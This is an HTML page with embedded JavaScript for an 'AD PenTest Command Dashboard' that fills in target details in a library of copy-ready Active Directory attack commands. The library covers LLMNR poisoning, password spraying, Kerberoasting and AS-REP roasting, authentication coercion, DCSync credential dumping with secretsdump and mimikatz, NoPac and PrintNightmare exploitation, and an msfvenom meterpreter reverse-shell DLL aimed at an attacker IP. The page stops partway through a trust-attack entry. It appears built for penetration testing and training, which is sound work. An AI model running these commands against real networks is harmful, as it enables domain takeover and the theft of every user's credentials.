
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AD PenTest Command Dashboard</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        
        body {
            background: linear-gradient(135deg, #0a0e27 0%, #1a0033 50%, #0f0f0f 100%);
            color: #fff;
            font-family: 'Consolas', 'Monaco', 'Courier New', monospace;
            min-height: 100vh;
            padding: 15px;
            line-height: 1.6;
        }

        .header {
            text-align: center;
            padding: 25px 0;
            border-bottom: 3px solid #00ff00;
            margin-bottom: 25px;
            animation: glow 2s ease-in-out infinite alternate;
        }

        @keyframes glow {
            from { border-bottom-color: #00ff00; }
            to { border-bottom-color: #00d4ff; }
        }

        .header h1 {
            font-size: 2.5em;
            background: linear-gradient(120deg, #00ff00, #00d4ff, #1abc9c);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
            margin-bottom: 8px;
            text-shadow: 0 0 20px rgba(0, 255, 0, 0.3);
        }

        .header .subtitle {
            color: #1abc9c;
            font-size: 1.1em;
            margin-top: 10px;
        }

        .config-section {
            max-width: 1200px;
            margin: 0 auto 30px;
            background: linear-gradient(135deg, #1a1a1a, #242424);
            border: 2px solid #1abc9c;
            border-radius: 10px;
            padding: 25px;
        }

        .config-title {
            font-size: 1.4em;
            color: #00d4ff;
            margin-bottom: 20px;
            text-align: center;
            border-bottom: 2px solid #1abc9c;
            padding-bottom: 10px;
        }

        .form-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 15px;
            margin-bottom: 20px;
        }

        .form-group {
            display: flex;
            flex-direction: column;
        }

        .form-group label {
            color: #1abc9c;
            font-weight: bold;
            margin-bottom: 5px;
            font-size: 0.9em;
        }

        .form-group input {
            padding: 12px;
            background: #0f0f0f;
            border: 2px solid #1abc9c;
            color: #00ff00;
            border-radius: 5px;
            font-family: 'Consolas', monospace;
            font-size: 0.95em;
            transition: all 0.3s;
        }

        .form-group input:focus {
            outline: none;
            border-color: #00d4ff;
            box-shadow: 0 0 15px rgba(0, 212, 255, 0.4);
        }

        .form-group input::placeholder {
            color: #555;
        }

        .form-actions {
            display: flex;
            gap: 15px;
            justify-content: center;
            margin-top: 20px;
        }

        .btn {
            padding: 12px 30px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-weight: bold;
            font-size: 1em;
            transition: all 0.3s;
            font-family: 'Consolas', monospace;
        }

        .btn-primary {
            background: linear-gradient(120deg, #00ff00, #1abc9c);
            color: #0f0f0f;
        }

        .btn-primary:hover {
            transform: scale(1.05);
            box-shadow: 0 0 20px rgba(0, 255, 0, 0.5);
        }

        .btn-secondary {
            background: #3a3a3a;
            color: #fff;
            border: 2px solid #1abc9c;
        }

        .btn-secondary:hover {
            background: #1abc9c;
            color: #0f0f0f;
        }

        .target-info {
            background: #0f0f0f;
            border: 2px solid #00ff00;
            border-radius: 8px;
            padding: 20px;
            margin: 20px auto;
            max-width: 1200px;
            display: none;
        }

        .target-info.active {
            display: block;
            animation: slideIn 0.5s ease-out;
        }

        @keyframes slideIn {
            from { opacity: 0; transform: translateY(-20px); }
            to { opacity: 1; transform: translateY(0); }
        }

        .target-info h3 {
            color: #00d4ff;
            margin-bottom: 15px;
            font-size: 1.3em;
        }

        .info-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 12px;
        }

        .info-item {
            display: flex;
            padding: 8px;
            background: #1a1a1a;
            border-radius: 4px;
            border-left: 3px solid #1abc9c;
        }

        .info-label {
            color: #1abc9c;
            font-weight: bold;
            margin-right: 10px;
            min-width: 80px;
        }

        .info-value {
            color: #00ff00;
            word-break: break-all;
        }

        .stats {
            display: flex;
            justify-content: center;
            gap: 50px;
            margin: 30px 0;
            flex-wrap: wrap;
        }

        .stat {
            text-align: center;
            padding: 15px 30px;
            background: linear-gradient(135deg, #1a1a1a, #242424);
            border: 2px solid #1abc9c;
            border-radius: 8px;
        }

        .stat-num {
            font-size: 2.2em;
            color: #00d4ff;
            font-weight: bold;
        }

        .stat-label {
            color: #bdc3c7;
            font-size: 0.9em;
            margin-top: 5px;
        }

        .filter-section {
            max-width: 1200px;
            margin: 20px auto;
            display: flex;
            gap: 15px;
            flex-wrap: wrap;
            justify-content: center;
            align-items: center;
        }

        .filter-section input,
        .filter-section select {
            padding: 10px 15px;
            background: #1a1a1a;
            border: 2px solid #1abc9c;
            color: #00d4ff;
            border-radius: 5px;
            font-family: 'Consolas', monospace;
            font-size: 0.9em;
        }

        .filter-section input {
            min-width: 300px;
        }

        .filter-section select {
            min-width: 150px;
            cursor: pointer;
        }

        .command-container {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(450px, 1fr));
            gap: 20px;
            max-width: 2000px;
            margin: 0 auto;
            padding: 20px;
        }

        .command-card {
            background: linear-gradient(135deg, #1a1a1a, #242424);
            border: 2px solid #1abc9c;
            border-radius: 10px;
            padding: 20px;
            transition: all 0.3s;
            cursor: pointer;
            position: relative;
            overflow: hidden;
        }

        .command-card:hover {
            border-color: #00d4ff;
            box-shadow: 0 0 25px rgba(0, 212, 255, 0.4);
            transform: translateY(-5px);
        }

        .command-card.copied {
            border-color: #00ff00;
            animation: copyFlash 0.5s ease;
        }

        @keyframes copyFlash {
            0%, 100% { background: linear-gradient(135deg, #1a1a1a, #242424); }
            50% { background: linear-gradient(135deg, #1a2a1a, #243a24); }
        }

        .card-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 12px;
            padding-bottom: 12px;
            border-bottom: 2px solid #1abc9c;
        }

        .card-title {
            font-size: 1.2em;
            color: #00d4ff;
            font-weight: bold;
        }

        .card-phase {
            background: #0f0f0f;
            color: #1abc9c;
            padding: 4px 12px;
            border-radius: 4px;
            font-size: 0.8em;
            border: 1px solid #1abc9c;
        }

        .card-meta {
            display: flex;
            gap: 15px;
            margin-bottom: 10px;
            flex-wrap: wrap;
        }

        .meta-tag {
            font-size: 0.8em;
            color: #bdc3c7;
            background: #0f0f0f;
            padding: 3px 10px;
            border-radius: 3px;
            border: 1px solid #3a3a3a;
        }

        .card-description {
            color: #bdc3c7;
            font-size: 0.9em;
            margin-bottom: 15px;
            line-height: 1.5;
        }

        .command-box {
            background: #0f0f0f;
            border-left: 4px solid #00ff00;
            padding: 15px;
            border-radius: 5px;
            margin: 15px 0;
            position: relative;
        }

        .command-text {
            color: #00ff00;
            font-size: 0.85em;
            word-break: break-all;
            font-family: 'Consolas', monospace;
            line-height: 1.6;
            max-height: 150px;
            overflow-y: auto;
        }

        .command-text::-webkit-scrollbar {
            width: 8px;
        }

        .command-text::-webkit-scrollbar-track {
            background: #1a1a1a;
        }

        .command-text::-webkit-scrollbar-thumb {
            background: #1abc9c;
            border-radius: 4px;
        }

        .copy-btn {
            width: 100%;
            padding: 12px;
            background: linear-gradient(120deg, #00ff00, #1abc9c);
            color: #0f0f0f;
            border: none;
            border-radius: 5px;
            font-weight: bold;
            cursor: pointer;
            font-size: 1em;
            transition: all 0.3s;
            margin-top: 10px;
        }

        .copy-btn:hover {
            transform: scale(1.02);
            box-shadow: 0 0 20px rgba(0, 255, 0, 0.5);
        }

        .copy-btn:active {
            transform: scale(0.98);
        }

        .copy-indicator {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background: rgba(0, 255, 0, 0.95);
            color: #0f0f0f;
            padding: 15px 30px;
            border-radius: 8px;
            font-weight: bold;
            font-size: 1.2em;
            opacity: 0;
            pointer-events: none;
            z-index: 1000;
            transition: opacity 0.3s;
        }

        .copy-indicator.show {
            opacity: 1;
        }

        .no-results {
            grid-column: 1 / -1;
            text-align: center;
            padding: 80px 20px;
            color: #bdc3c7;
            font-size: 1.2em;
        }

        .legend {
            max-width: 1200px;
            margin: 20px auto;
            padding: 15px;
            background: #1a1a1a;
            border: 1px solid #1abc9c;
            border-radius: 8px;
            text-align: center;
        }

        .legend-title {
            color: #00d4ff;
            font-weight: bold;
            margin-bottom: 10px;
        }

        .legend-items {
            display: flex;
            gap: 20px;
            justify-content: center;
            flex-wrap: wrap;
        }

        .legend-item {
            display: flex;
            align-items: center;
            gap: 8px;
            font-size: 0.85em;
        }

        .legend-box {
            width: 20px;
            height: 20px;
            border-radius: 3px;
        }

        .requires-creds { background: #ff6b6b; }
        .no-creds { background: #4ecdc4; }
        .both { background: #ffe66d; }

        @media (max-width: 768px) {
            .command-container {
                grid-template-columns: 1fr;
            }
            .header h1 {
                font-size: 1.8em;
            }
            .form-grid {
                grid-template-columns: 1fr;
            }
        }

        .tooltip {
            position: relative;
            display: inline-block;
        }

        .tooltip .tooltiptext {
            visibility: hidden;
            width: 200px;
            background-color: #0f0f0f;
            color: #00ff00;
            text-align: center;
            border-radius: 6px;
            padding: 8px;
            position: absolute;
            z-index: 1;
            bottom: 125%;
            left: 50%;
            margin-left: -100px;
            opacity: 0;
            transition: opacity 0.3s;
            border: 1px solid #1abc9c;
            font-size: 0.8em;
        }

        .tooltip:hover .tooltiptext {
            visibility: visible;
            opacity: 1;
        }
    </style>
</head>
<body>

<div class="header">
    <h1>‚ö° AD PENTEST COMMAND CENTER ‚ö°</h1>
    <div class="subtitle">Professional Active Directory Security Assessment Tool</div>
</div>

<div class="config-section">
    <div class="config-title">üéØ Target Configuration</div>
    <div class="form-grid">
        <div class="form-group">
            <label for="dcName">DC Name (FQDN)</label>
            <input type="text" id="dcName" placeholder="e.g., DC01.INLANEFREIGHT.LOCAL">
        </div>
        <div class="form-group">
            <label for="dcIP">DC IP Address</label>
            <input type="text" id="dcIP" placeholder="e.g., 172.16.5.5">
        </div>
        <div class="form-group">
            <label for="domain">Domain (FQDN)</label>
            <input type="text" id="domain" placeholder="e.g., INLANEFREIGHT.LOCAL">
        </div>
        <div class="form-group">
            <label for="domainShort">Domain (Short)</label>
            <input type="text" id="domainShort" placeholder="e.g., INLANEFREIGHT">
        </div>
        <div class="form-group">
            <label for="attackerIP">Attacker IP (Optional)</label>
            <input type="text" id="attackerIP" placeholder="e.g., 10.10.14.5">
        </div>
        <div class="form-group">
            <label for="username">Username (Optional)</label>
            <input type="text" id="username" placeholder="e.g., forend">
        </div>
        <div class="form-group">
            <label for="password">Password (Optional)</label>
            <input type="password" id="password" placeholder="Password">
        </div>
        <div class="form-group">
            <label for="ntHash">NT Hash (Optional)</label>
            <input type="text" id="ntHash" placeholder="NT Hash">
        </div>
    </div>
    <div class="form-actions">
        <button class="btn btn-primary" onclick="applyConfig()">‚ö° Load Commands</button>
        <button class="btn btn-secondary" onclick="clearConfig()">üîÑ Reset</button>
        <button class="btn btn-secondary" onclick="exportConfig()">üíæ Export Config</button>
    </div>
</div>

<div class="target-info" id="targetInfo">
    <h3>üéØ Active Target Information</h3>
    <div class="info-grid" id="infoGrid"></div>
</div>

<div class="stats">
    <div class="stat">
        <div class="stat-num" id="totalCommands">0</div>
        <div class="stat-label">Total Commands</div>
    </div>
    <div class="stat">
        <div class="stat-num" id="totalPhases">0</div>
        <div class="stat-label">Phases</div>
    </div>
    <div class="stat">
        <div class="stat-num" id="availableCommands">0</div>
        <div class="stat-label">Available</div>
    </div>
</div>

<div class="filter-section">
    <input type="text" id="searchFilter" placeholder="üîç Search commands..." oninput="applyFilters()">
    <select id="phaseFilter" onchange="applyFilters()">
        <option value="">All Phases</option>
    </select>
    <select id="credFilter" onchange="applyFilters()">
        <option value="">All Commands</option>
        <option value="no-creds">No Credentials Needed</option>
        <option value="creds">Requires Credentials</option>
    </select>
    <button class="btn btn-secondary" onclick="resetFilters()">Clear Filters</button>
</div>

<div class="legend">
    <div class="legend-title">Command Types</div>
    <div class="legend-items">
        <div class="legend-item">
            <div class="legend-box no-creds"></div>
            <span>No Credentials Required</span>
        </div>
        <div class="legend-item">
            <div class="legend-box requires-creds"></div>
            <span>Requires Credentials</span>
        </div>
        <div class="legend-item">
            <div class="legend-box both"></div>
            <span>Optional Credentials</span>
        </div>
    </div>
</div>

<div class="command-container" id="commandContainer"></div>

<div class="copy-indicator" id="copyIndicator">‚úì Copied to Clipboard!</div>

<script>
// Command Library with all AD pentesting commands
const commandLibrary = [
    // Phase 1: Initial Enumeration (No Credentials)
    {
        phase: "Phase 1",
        title: "DNS Enumeration - Lookup DC",
        description: "Query DNS for Domain Controller information",
        category: "DNS",
        requiresCreds: false,
        command: "nslookup {DC_NAME}\nnslookup {DC_IP}"
    },
    {
        phase: "Phase 1",
        title: "DNS SRV Records",
        description: "Enumerate LDAP SRV records via DNS",
        category: "DNS",
        requiresCreds: false,
        command: "nslookup -type=SRV _ldap._tcp.dc._msdcs.{DOMAIN}"
    },
    {
        phase: "Phase 1",
        title: "Ping Sweep Network",
        description: "Discover live hosts in the network",
        category: "Network Discovery",
        requiresCreds: false,
        command: "fping -asgq {NETWORK}.0/24"
    },
    {
        phase: "Phase 1",
        title: "Comprehensive Nmap Scan",
        description: "Full service and version detection on DC",
        category: "Network Discovery",
        requiresCreds: false,
        command: "sudo nmap -v -A -p- {DC_IP} -oN nmap-{DC_NAME}"
    },
    {
        phase: "Phase 1",
        title: "Nmap - Common AD Ports",
        description: "Scan standard Active Directory ports",
        category: "Network Discovery",
        requiresCreds: false,
        command: "sudo nmap -v -sC -sV -p 53,88,135,139,389,445,464,636,3268,3269,5985,5986 {DC_IP} -oN nmap-detailed"
    },
    {
        phase: "Phase 1",
        title: "Responder - Passive Mode",
        description: "Listen for LLMNR/NBT-NS traffic (analysis only)",
        category: "LLMNR/NBT-NS",
        requiresCreds: false,
        command: "sudo responder -I ens224 -A"
    },
    {
        phase: "Phase 1",
        title: "Responder - Active Poisoning",
        description: "Actively poison LLMNR/NBT-NS requests",
        category: "LLMNR/NBT-NS",
        requiresCreds: false,
        command: "sudo responder -I ens224 -wrf"
    },
    {
        phase: "Phase 1",
        title: "Crack NTLMv2 Hash",
        description: "Crack captured NTLMv2 hashes with hashcat",
        category: "Hash Cracking",
        requiresCreds: false,
        command: "hashcat -m 5600 captured_hash.txt /usr/share/wordlists/rockyou.txt"
    },
    {
        phase: "Phase 1",
        title: "Kerbrute - User Enumeration",
        description: "Enumerate valid domain users via Kerberos",
        category: "User Enumeration",
        requiresCreds: false,
        command: "kerbrute userenum -d {DOMAIN} --dc {DC_IP} /opt/jsmith.txt -o kerb-results"
    },
    {
        phase: "Phase 1",
        title: "enum4linux - User Enumeration",
        description: "Extract user list via SMB NULL session",
        category: "User Enumeration",
        requiresCreds: false,
        command: "enum4linux -U {DC_IP} | grep \"user:\" | cut -f2 -d\"[\" | cut -f1 -d\"]\""
    },
    {
        phase: "Phase 1",
        title: "rpcclient - NULL Session",
        description: "Connect with NULL session and enumerate users",
        category: "User Enumeration",
        requiresCreds: false,
        command: "rpcclient -U \"\" -N {DC_IP}\n# Then run: enumdomusers"
    },
    {
        phase: "Phase 1",
        title: "CrackMapExec - User Enum",
        description: "Enumerate users without credentials",
        category: "User Enumeration",
        requiresCreds: false,
        command: "crackmapexec smb {DC_IP} --users"
    },
    {
        phase: "Phase 1",
        title: "windapsearch - Users",
        description: "LDAP user enumeration with windapsearch",
        category: "User Enumeration",
        requiresCreds: false,
        command: "./windapsearch.py --dc-ip {DC_IP} -u \"\" -U"
    },
    {
        phase: "Phase 1",
        title: "enum4linux - Password Policy",
        description: "Enumerate domain password policy",
        category: "Password Policy",
        requiresCreds: false,
        command: "enum4linux -P {DC_IP}"
    },
    {
        phase: "Phase 1",
        title: "enum4linux-ng - Full Enum",
        description: "Modern enum4linux with all checks",
        category: "Password Policy",
        requiresCreds: false,
        command: "enum4linux-ng -P {DC_IP} -oA enum4linux-output"
    },
    {
        phase: "Phase 1",
        title: "LDAP Anonymous - Password Policy",
        description: "Query password policy via anonymous LDAP",
        category: "Password Policy",
        requiresCreds: false,
        command: "ldapsearch -h {DC_IP} -x -b \"{BASE_DN}\" -s sub \"*\" | grep -m 1 -B 10 pwdHistoryLength"
    },

    // Phase 2: Password Attacks
    {
        phase: "Phase 2",
        title: "Password Spray - CrackMapExec",
        description: "Spray password across user list",
        category: "Password Spray",
        requiresCreds: false,
        command: "crackmapexec smb {DC_IP} -u valid_users.txt -p Password123 | grep +"
    },
    {
        phase: "Phase 2",
        title: "Password Spray - Kerbrute",
        description: "Kerberos-based password spray (stealthy)",
        category: "Password Spray",
        requiresCreds: false,
        command: "kerbrute passwordspray -d {DOMAIN} --dc {DC_IP} valid_users.txt Welcome1"
    },
    {
        phase: "Phase 2",
        title: "Password Spray - rpcclient",
        description: "Spray via RPC authentication attempts",
        category: "Password Spray",
        requiresCreds: false,
        command: "for u in $(cat valid_users.txt); do rpcclient -U \"$u%Welcome1\" -c \"getusername;quit\" {DC_IP} | grep Authority; done"
    },
    {
        phase: "Phase 2",
        title: "Local Admin Spray",
        description: "Test local administrator credentials (avoid lockout)",
        category: "Password Spray",
        requiresCreds: false,
        command: "sudo crackmapexec smb --local-auth {DC_IP} -u administrator -H HASH | grep +"
    },

    // Phase 3: Credentialed Enumeration
    {
        phase: "Phase 3",
        title: "RDP Connection",
        description: "Connect via Remote Desktop Protocol",
        category: "Remote Access",
        requiresCreds: true,
        command: "xfreerdp /u:{USERNAME}@{DOMAIN} /p:{PASSWORD} /v:{DC_IP}"
    },
    {
        phase: "Phase 3",
        title: "WinRM - evil-winrm",
        description: "PowerShell remoting via WinRM",
        category: "Remote Access",
        requiresCreds: true,
        command: "evil-winrm -i {DC_IP} -u {USERNAME} -p '{PASSWORD}'"
    },
    {
        phase: "Phase 3",
        title: "PSExec - Impacket",
        description: "Execute commands via PSExec",
        category: "Remote Access",
        requiresCreds: true,
        command: "psexec.py {DOMAIN}/{USERNAME}:'{PASSWORD}'@{DC_IP}"
    },
    {
        phase: "Phase 3",
        title: "WMIExec - Impacket",
        description: "Execute commands via WMI",
        category: "Remote Access",
        requiresCreds: true,
        command: "wmiexec.py {DOMAIN}/{USERNAME}:'{PASSWORD}'@{DC_IP}"
    },
    {
        phase: "Phase 3",
        title: "CrackMapExec - User Enumeration",
        description: "Enumerate all domain users with credentials",
        category: "User Enumeration",
        requiresCreds: true,
        command: "crackmapexec smb {DC_IP} -u {USERNAME} -p '{PASSWORD}' --users"
    },
    {
        phase: "Phase 3",
        title: "CrackMapExec - Group Enumeration",
        description: "Enumerate all domain groups",
        category: "Group Enumeration",
        requiresCreds: true,
        command: "crackmapexec smb {DC_IP} -u {USERNAME} -p '{PASSWORD}' --groups"
    },
    {
        phase: "Phase 3",
        title: "CrackMapExec - Logged On Users",
        description: "Find currently logged on users",
        category: "User Enumeration",
        requiresCreds: true,
        command: "crackmapexec smb {DC_IP} -u {USERNAME} -p '{PASSWORD}' --loggedon-users"
    },
    {
        phase: "Phase 3",
        title: "CrackMapExec - Share Enumeration",
        description: "List accessible SMB shares",
        category: "Share Enumeration",
        requiresCreds: true,
        command: "crackmapexec smb {DC_IP} -u {USERNAME} -p '{PASSWORD}' --shares"
    },
    {
        phase: "Phase 3",
        title: "CrackMapExec - Spider Shares",
        description: "Spider and search share contents",
        category: "Share Enumeration",
        requiresCreds: true,
        command: "crackmapexec smb {DC_IP} -u {USERNAME} -p '{PASSWORD}' -M spider_plus --share SYSVOL"
    },
    {
        phase: "Phase 3",
        title: "SMBMap - Share Enumeration",
        description: "Map SMB shares with permissions",
        category: "Share Enumeration",
        requiresCreds: true,
        command: "smbmap -u {USERNAME} -p '{PASSWORD}' -d {DOMAIN} -H {DC_IP}"
    },
    {
        phase: "Phase 3",
        title: "SMBMap - SYSVOL Enumeration",
        description: "List SYSVOL directory structure",
        category: "Share Enumeration",
        requiresCreds: true,
        command: "smbmap -u {USERNAME} -p '{PASSWORD}' -d {DOMAIN} -H {DC_IP} -R SYSVOL --dir-only"
    },
    {
        phase: "Phase 3",
        title: "LDAP User Enumeration",
        description: "Extract all user accounts via LDAP",
        category: "LDAP",
        requiresCreds: true,
        command: "ldapsearch -h {DC_IP} -x -b \"{BASE_DN}\" -s sub \"(&(objectclass=user))\" | grep sAMAccountName: | cut -f2 -d\" \""
    },
    {
        phase: "Phase 3",
        title: "windapsearch - Domain Admins",
        description: "Find Domain Administrator accounts",
        category: "LDAP",
        requiresCreds: true,
        command: "python3 windapsearch.py --dc-ip {DC_IP} -u {DOMAIN}\\\\{USERNAME} -p '{PASSWORD}' --da"
    },
    {
        phase: "Phase 3",
        title: "windapsearch - Privileged Users",
        description: "Enumerate privileged user accounts",
        category: "LDAP",
        requiresCreds: true,
        command: "python3 windapsearch.py --dc-ip {DC_IP} -u {DOMAIN}\\\\{USERNAME} -p '{PASSWORD}' -PU"
    },
    {
        phase: "Phase 3",
        title: "BloodHound Collection - Python",
        description: "Collect AD data for BloodHound analysis",
        category: "BloodHound",
        requiresCreds: true,
        command: "sudo bloodhound-python -u '{USERNAME}' -p '{PASSWORD}' -ns {DC_IP} -d {DOMAIN} -c all\nzip -r bloodhound-{DOMAIN_SHORT}.zip *.json"
    },
    {
        phase: "Phase 3",
        title: "BloodHound Collection - SharpHound",
        description: "Windows-based BloodHound collection",
        category: "BloodHound",
        requiresCreds: true,
        command: ".\\SharpHound.exe -c All --zipfilename bh-{DOMAIN_SHORT}"
    },

    // Phase 5: Kerberos Attacks
    {
        phase: "Phase 5",
        title: "Kerberoasting - Enumerate SPNs",
        description: "List all service principal names",
        category: "Kerberoasting",
        requiresCreds: true,
        command: "GetUserSPNs.py -dc-ip {DC_IP} {DOMAIN}/{USERNAME}:'{PASSWORD}'"
    },
    {
        phase: "Phase 5",
        title: "Kerberoasting - Request All TGS",
        description: "Request TGS tickets for all SPNs",
        category: "Kerberoasting",
        requiresCreds: true,
        command: "GetUserSPNs.py -dc-ip {DC_IP} {DOMAIN}/{USERNAME}:'{PASSWORD}' -request"
    },
    {
        phase: "Phase 5",
        title: "Kerberoasting - Specific User",
        description: "Target specific service account",
        category: "Kerberoasting",
        requiresCreds: true,
        command: "GetUserSPNs.py -dc-ip {DC_IP} {DOMAIN}/{USERNAME}:'{PASSWORD}' -request-user sqldev -outputfile tgs-sqldev.txt"
    },
    {
        phase: "Phase 5",
        title: "Crack Kerberoast Hash",
        description: "Crack TGS-REP hash with hashcat",
        category: "Kerberoasting",
        requiresCreds: false,
        command: "hashcat -m 13100 tgs-sqldev.txt /usr/share/wordlists/rockyou.txt --force"
    },
    {
        phase: "Phase 5",
        title: "AS-REP Roasting - Impacket",
        description: "Request AS-REP hashes for users without preauth",
        category: "AS-REP Roasting",
        requiresCreds: false,
        command: "GetNPUsers.py {DOMAIN}/ -usersfile users.txt -format hashcat -outputfile asrep_hashes.txt -dc-ip {DC_IP}"
    },
    {
        phase: "Phase 5",
        title: "Crack AS-REP Hash",
        description: "Crack AS-REP hash with hashcat",
        category: "AS-REP Roasting",
        requiresCreds: false,
        command: "hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt"
    },
    {
        phase: "Phase 5",
        title: "Rubeus - Kerberoast Stats",
        description: "Get statistics on kerberoastable accounts (Windows)",
        category: "Kerberoasting",
        requiresCreds: true,
        command: ".\\Rubeus.exe kerberoast /stats"
    },
    {
        phase: "Phase 5",
        title: "Rubeus - Kerberoast All",
        description: "Kerberoast all accounts with Rubeus (Windows)",
        category: "Kerberoasting",
        requiresCreds: true,
        command: ".\\Rubeus.exe kerberoast /nowrap"
    },
    {
        phase: "Phase 5",
        title: "Rubeus - AS-REP Roast",
        description: "AS-REP roast with Rubeus (Windows)",
        category: "AS-REP Roasting",
        requiresCreds: false,
        command: ".\\Rubeus.exe asreproast /nowrap /format:hashcat"
    },

    // Phase 7: Delegation Attacks
    {
        phase: "Phase 7",
        title: "Find Unconstrained Delegation",
        description: "Enumerate computers with unconstrained delegation (PowerView)",
        category: "Delegation",
        requiresCreds: true,
        command: "Get-DomainComputer -Unconstrained | Select-Object name,dnshostname"
    },
    {
        phase: "Phase 7",
        title: "Check PrinterBug Vulnerability",
        description: "Test if DC is vulnerable to PrinterBug",
        category: "Delegation",
        requiresCreds: false,
        command: "rpcdump.py @{DC_IP} | egrep 'MS-RPRN|MS-PAR'"
    },
    {
        phase: "Phase 7",
        title: "Monitor for TGT - Rubeus",
        description: "Monitor for incoming TGT tickets (Windows)",
        category: "Delegation",
        requiresCreds: true,
        command: ".\\Rubeus.exe monitor /interval:5 /nowrap"
    },
    {
        phase: "Phase 7",
        title: "Force Auth - SpoolSample",
        description: "Force DC authentication via PrinterBug (Windows)",
        category: "Delegation",
        requiresCreds: true,
        command: ".\\SpoolSample.exe {DC_NAME} COMPROMISED_HOST"
    },
    {
        phase: "Phase 7",
        title: "Force Auth - PetitPotam",
        description: "Force DC authentication via PetitPotam",
        category: "Delegation",
        requiresCreds: false,
        command: "python3 PetitPotam.py COMPROMISED_HOST {DC_IP}"
    },

    // Phase 8: DCSync Attack
    {
        phase: "Phase 8",
        title: "DCSync - All Hashes",
        description: "Extract all domain password hashes",
        category: "DCSync",
        requiresCreds: true,
        command: "secretsdump.py -outputfile {DOMAIN_SHORT}-hashes -just-dc {DOMAIN}/{USERNAME}:'{PASSWORD}'@{DC_IP}"
    },
    {
        phase: "Phase 8",
        title: "DCSync - Administrator",
        description: "Extract Administrator account hash",
        category: "DCSync",
        requiresCreds: true,
        command: "secretsdump.py -just-dc-user {DOMAIN}/administrator {DOMAIN}/{USERNAME}:'{PASSWORD}'@{DC_IP}"
    },
    {
        phase: "Phase 8",
        title: "DCSync - VSS Method",
        description: "Use Volume Shadow Copy method for extraction",
        category: "DCSync",
        requiresCreds: true,
        command: "secretsdump.py -outputfile {DOMAIN_SHORT}-hashes -just-dc {DOMAIN}/{USERNAME}:'{PASSWORD}'@{DC_IP} -use-vss"
    },
    {
        phase: "Phase 8",
        title: "DCSync - Mimikatz",
        description: "DCSync with Mimikatz (Windows)",
        category: "DCSync",
        requiresCreds: true,
        command: "mimikatz # lsadump::dcsync /domain:{DOMAIN} /user:{DOMAIN}\\\\administrator"
    },
    {
        phase: "Phase 8",
        title: "DCSync - krbtgt Hash",
        description: "Extract krbtgt hash for Golden Ticket",
        category: "DCSync",
        requiresCreds: true,
        command: "mimikatz # lsadump::dcsync /domain:{DOMAIN} /user:{DOMAIN}\\\\krbtgt"
    },

    // Phase 10: Known Vulnerabilities
    {
        phase: "Phase 10",
        title: "NoPac - Vulnerability Scan",
        description: "Scan for NoPac (CVE-2021-42278/42287)",
        category: "Vulnerability",
        requiresCreds: true,
        command: "sudo python3 scanner.py {DOMAIN}/{USERNAME}:'{PASSWORD}' -dc-ip {DC_IP} -use-ldap"
    },
    {
        phase: "Phase 10",
        title: "NoPac - Exploit (Shell)",
        description: "Exploit NoPac to get shell",
        category: "Vulnerability",
        requiresCreds: true,
        command: "sudo python3 noPac.py {DOMAIN}/{USERNAME}:'{PASSWORD}' -dc-ip {DC_IP} -dc-host {DC_NAME} -shell --impersonate administrator -use-ldap"
    },
    {
        phase: "Phase 10",
        title: "NoPac - Exploit (DCSync)",
        description: "Exploit NoPac to perform DCSync",
        category: "Vulnerability",
        requiresCreds: true,
        command: "sudo python3 noPac.py {DOMAIN}/{USERNAME}:'{PASSWORD}' -dc-ip {DC_IP} -dc-host {DC_NAME} --impersonate administrator -use-ldap -dump -just-dc-user {DOMAIN}/administrator"
    },
    {
        phase: "Phase 10",
        title: "PrintNightmare - Check Vuln",
        description: "Check for PrintNightmare vulnerability",
        category: "Vulnerability",
        requiresCreds: false,
        command: "rpcdump.py @{DC_IP} | egrep 'MS-RPRN|MS-PAR'"
    },
    {
        phase: "Phase 10",
        title: "PrintNightmare - Generate Payload",
        description: "Create malicious DLL payload",
        category: "Vulnerability",
        requiresCreds: false,
        command: "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={ATTACKER_IP} LPORT=8080 -f dll > payload.dll"
    },
    {
        phase: "Phase 10",
        title: "PrintNightmare - Host Payload",
        description: "Host payload via SMB server",
        category: "Vulnerability",
        requiresCreds: false,
        command: "sudo smbserver.py -smb2support CompData /path/to/payload/"
    },
    {
        phase: "Phase 10",
        title: "PrintNightmare - Exploit",
        description: "Execute PrintNightmare exploit",
        category: "Vulnerability",
        requiresCreds: true,
        command: "sudo python3 CVE-2021-1675.py {DOMAIN}/{USERNAME}:'{PASSWORD}'@{DC_IP} '\\\\\\\\{ATTACKER_IP}\\\\CompData\\\\payload.dll'"
    },
    {
        phase: "Phase 10",
        title: "PetitPotam - Setup NTLM Relay",
        description: "Setup relay to ADCS for certificate",
        category: "Vulnerability",
        requiresCreds: false,
        command: "sudo ntlmrelayx.py -debug -smb2support --target http://CA-SERVER/certsrv/certfnsh.asp --adcs --template DomainController"
    },
    {
        phase: "Phase 10",
        title: "PetitPotam - Trigger",
        description: "Trigger PetitPotam authentication coercion",
        category: "Vulnerability",
        requiresCreds: false,
        command: "python3 PetitPotam.py {ATTACKER_IP} {DC_IP}"
    },

    // Phase 11: Trust Attacks
    {
        phase: "Phase 11",
        title: "Enumerate Domain Trusts",
        description: "List all domain trust relationships (PowerView)",
        category: "Trust",
        requiresCreds: true,
        command: "Get-DomainTrust"
    },
    {
        phase: "Phase 11",
        title: "Enumerate Forest Trusts",
        description: "List forest trust relationships (PowerView)",
        category: "Trust",
        requiresCreds: true,
        command: "Get-ForestTrust"
    },
    {
        phase: "Phase 11",
        title: "Get Domain SIDs",
        description: "Retrieve domain SIDs for trust attacks",
        category: "Trust",
        requiresCreds: true,
        command: "lookupsid.py {DOMAIN}/{USERNAME}:'{PASSWORD}'@{DC_IP} | grep \"Domain SID\""
    },
    {
        phase: "Phase 11",
        title: "Cross-Forest Kerberoast",
        description: "Kerberoast accounts in trusted forest",
        category: "Trust",
        requiresCreds: true,
